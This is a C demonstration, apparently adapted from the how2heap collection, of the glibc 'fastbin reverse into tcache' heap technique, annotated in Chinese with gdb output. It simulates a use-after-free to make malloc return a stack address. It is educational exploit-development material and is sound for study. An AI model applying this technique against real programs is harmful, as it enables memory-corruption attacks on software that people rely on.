#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

const size_t allocsize = 0x40;

int main(){
  setbuf(stdout, NULL);//不使用缓冲区，有输出会直接输出，不需要等缓冲区填满再输出

  // Allocate 14 times so that we can free later.
  char* ptrs[14];
  size_t i;
  for (i = 0; i < 14; i++) {
    ptrs[i] = malloc(allocsize);
  }

  printf(
    "First we need to free(allocsize) at least 7 times to fill the tcache.\n"
    "(More than 7 times works fine too.)\n\n"
  );

  // 这里先将tcachebin中allocsize大小的链填满
  for (i = 0; i < 7; i++) {
    free(ptrs[i]);
  }

  char* victim = ptrs[7];
  printf(
    "The next pointer that we free is the chunk that we're going to corrupt: %p\n"
    "It doesn't matter if we corrupt it now or later. Because the tcache is\n"
    "already full, it will go in the fastbin.\n\n",
    victim
  );
  //此时释放的victim就会将这个free chunk添加到fastbin对应大小的链中
  free(victim);


  // 释放后面的六个chunk,填满这个fastbin。
  for (i = 8; i < 14; i++) {
    free(ptrs[i]);
  }

  // Create an array on the stack and initialize it with garbage.
  size_t stack_var[6];
  memset(stack_var, 0xcd, sizeof(stack_var));

  printf(
    "The stack address that we intend to target: %p\n"
    "It's current value is %p\n",
    &stack_var[2],
    (char*)stack_var[2]
  );

  printf(
    "Now we use a vulnerability such as a buffer overflow or a use-after-free\n"
    "to overwrite the next pointer at address %p\n\n",
    victim
  );

  //------------VULNERABILITY-----------

  // 这里使用UAF漏洞进行的修改内存操作,修改了原来victim所在的那个chunk的fd指针的位置
  //修改前
  //Free chunk (fastbins) | PREV_INUSE
  //Addr: 0x555555757480
  //Size: 0x51
  //fd: 0x00

  *(size_t**)victim = &stack_var[0];

  //修改后
  //Free chunk (fastbins) | PREV_INUSE
  //Addr: 0x555555757480
  //Size: 0x51
  //fd: 0x7fffffffddd0
  //可以看出这个chunk的fd指针不再是0x00

  // 这里先清空掉allocsize这条tcachebin链上的所有chunk
  for (i = 0; i < 7; i++) {
    ptrs[i] = malloc(allocsize);
  }

  //现在申请一块allocsize大小的内存，首先会检测tcachebin中是否有空闲块，tcachebin中没有对应的空闲块，就会从fastbin中先取出一个，之后将fastbin中的chunk反向挂到tcachebin中
  //fastbins
  //0x50: 0x555555757660 —▸ 0x555555757610 —▸ 0x5555557575c0 —▸ 0x555555757570 —▸ 0x555555757520 ◂— ...
  //由于gdb没有显示完全，所有在这条链后面应该还有0x5555557574d0 —▸ 0x555555757480 —▸ 0x7fffffffddd0 —▸ 0xcdcdcdcdcdcdcdcd
  malloc(allocsize);

  //申请内存后
  //tcachebins
  //0x50 [  7]: 0x7fffffffdde0 —▸ 0x555555757490 —▸ 0x5555557574e0 —▸ 0x555555757530 —▸ 0x555555757580 —▸ 0x5555557575d0 —▸ 0x555555757620 ◂— 0x0
  //fastbins
  //0x50: 0xcdcdcdcdcdcdcdcd
  //这里倒序插入tcache的原因应该是fastbin是单链结构，只能从头取，再头插法插入tcachebin中，就形成了倒叙
  for (i = 0; i < 6; i++) {
    printf("%p: %p\n", &stack_var[i], (char*)stack_var[i]);
  }
  //此时我们再取一个allocsize大小的内存块就会拿到栈上的地址，通过对堆的操作直接修改栈的值
  
  char *q = malloc(allocsize);
  
  //gdb-peda$ p q
  //$3 = 0x7fffffffdde0 "\220tuUUU"
  //这里就可以到stack_var[2]以及之后allocsize大小内存的局部变量内容，影响程序，
  printf(
    "\n"
    "Finally, if we malloc one more time then we get the stack address back: %p\n",
    q
  );

  assert(q == (char *)&stack_var[2]);

  return 0;
}

//通过这个演示案例，可以看到UAF漏洞，在有的时候是可以让程序通过堆来对栈的内容进行操作，这里如果allocsize够大就有可能修改函数的返回值，大多数程序都会开启canary,
//所以更常见的情况是修改变量的值










